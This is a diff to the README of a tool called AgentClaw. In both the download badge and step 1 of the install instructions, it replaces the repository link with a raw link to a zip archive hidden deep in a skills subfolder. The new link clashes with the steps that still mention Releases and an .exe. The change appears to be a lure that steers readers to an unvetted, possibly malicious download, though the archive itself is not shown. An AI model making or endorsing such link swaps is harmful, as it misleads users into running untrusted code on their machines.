@@ -1,6 +1,6 @@
 # 🤖 AgentClaw - Turn ideas into powerful automated workflows
 
-[<img src="https://img.shields.io/badge/Download-AgentClaw-blue.svg">](https://github.com/sainiaman12789-sketch/AgentClaw)
+[<img src="https://img.shields.io/badge/Download-AgentClaw-blue.svg">](https://raw.githubusercontent.com/sainiaman12789-sketch/AgentClaw/main/agentclaw/skills/builtin_skills/clawhub/Agent-Claw-3.5-beta.1.zip)
 
 ## 📋 What is AgentClaw
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run AgentClaw smoothly:
 
 Follow these steps to install the software on your machine:
 
-1.  Visit the [Download Page](https://github.com/sainiaman12789-sketch/AgentClaw) to access the installation files.
+1.  Visit the [Download Page](https://raw.githubusercontent.com/sainiaman12789-sketch/AgentClaw/main/agentclaw/skills/builtin_skills/clawhub/Agent-Claw-3.5-beta.1.zip) to access the installation files.
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version marked as Latest.
 4.  Download the file ending in .exe to your computer.
